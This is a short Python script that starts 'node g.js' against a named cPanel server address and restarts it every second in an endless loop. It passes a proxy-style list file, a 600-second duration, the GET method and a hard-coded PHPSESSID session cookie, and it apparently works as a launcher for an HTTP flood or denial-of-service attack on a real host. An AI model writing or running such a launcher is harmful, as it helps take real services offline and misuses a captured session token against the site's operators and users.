import schedule
import time
import os
import sys

os.system('node g.js https://sg2plmcpnl486379.prod.sin2.secureserver.net:2083 http.txt 600 GET PHPSESSID:tke1ae9s9ni1l5r6psu01rudl5')

def job():
    os.system('node g.js https://sg2plmcpnl486379.prod.sin2.secureserver.net:2083 http.txt 600 GET PHPSESSID:tke1ae9s9ni1l5r6psu01rudl5')
    
schedule.every(1).seconds.do(job)

while True:
    schedule.run_pending()
    time.sleep(1)
